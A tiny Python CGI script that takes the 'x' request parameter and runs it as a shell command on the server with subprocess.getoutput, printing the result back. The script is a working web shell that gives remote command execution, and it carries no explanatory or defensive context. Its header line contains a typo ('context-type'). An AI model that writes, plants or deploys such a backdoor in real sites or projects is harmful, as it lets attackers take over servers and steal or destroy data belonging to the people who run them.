#!/usr/bin/python3

import cgi
import subprocess

print("context-type: text/html")
print()


f = cgi.FieldStorage()
cmd = f.getvalue("x")
output = subprocess.getoutput(cmd)
print(output)
